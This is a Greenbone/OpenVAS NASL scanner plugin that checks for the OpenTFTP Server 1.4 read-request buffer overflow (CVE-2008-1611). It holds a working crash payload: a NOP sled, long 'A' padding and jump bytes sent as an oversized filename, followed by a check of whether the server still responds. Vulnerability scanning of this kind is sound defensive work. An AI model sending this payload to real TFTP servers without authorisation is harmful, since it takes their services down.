# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802555");
  script_version("2023-07-21T05:05:22+0000");
  script_cve_id("CVE-2008-1611");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2012-01-12 19:12:13 +0530 (Thu, 12 Jan 2012)");
  script_name("OpenTFTP Server Read Request Buffer Overflow Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("tftpd_detect.nasl");
  script_require_udp_ports("Services/udp/tftp", 69);
  script_mandatory_keys("tftp/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/29508");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18345/");
  script_xref(name:"URL", value:"http://securityreason.com/securityalert/8552");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108546/tftprrq-overflow.txt");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause denial of service
  attacks.");

  script_tag(name:"affected", value:"OpenTFTP Server SP version 1.4.");

  script_tag(name:"insight", value:"The flaw is due to a boundary error in the handling of filenames and
  can be exploited to cause a stack-based buffer overflow via a read request with an overly long filename.");

  script_tag(name:"solution", value:"Upgrade to OpenTFTP Server SP version 1.5 or later.");

  script_tag(name:"summary", value:"OpenTFTP Server is prone to a buffer overflow vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("tftp.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = service_get_port(default:69, proto:"tftp", ipproto:"udp");

if(!tftp_alive(port:port))
  exit(0);

soc = open_sock_udp(port);
if(!soc)
  exit(0);

request = raw_string(0x00, 0x01, 0x6d, 0x79, 0x74, 0x65, 0x73, 0x74,
                     0x2e, 0x74, 0x78, 0x74, 0x00, 0x6e, 0x65, 0x74,
                     0x61, 0x73, 0x63, 0x69, 0x69, 0x00);

send(socket:soc, data:request);
result = recv(socket:soc, length:100);
if(isnull(result) && "File Not Found" >!< result)
  exit(0);

attack = raw_string(0x00, 0x01) + crap(data:raw_string(0x90), length:50) +
         crap(data:raw_string(0x41), length:1445) +
         raw_string(0xe9, 0x2e, 0xfa, 0xff, 0xff, 0xeb, 0xf9, 0x90, 0x90,
                    0x05, 0x96, 0x40, 0x00, 0x6e, 0x65, 0x74, 0x61, 0x73,
                    0x63, 0x69, 0x69, 0x00);

send(socket:soc, data:attack);
close(soc);

soc1 = open_sock_udp(port);
if(!soc1) {
  security_message(port:port, proto:"udp");
  exit(0);
}

send(socket:soc1, data:request);
result = recv(socket:soc1, length:100);
close(soc1);

if(isnull(result) && "File Not Found" >!< result) {
  security_message(port:port, proto:"udp");
  exit(0);
}

exit(99);
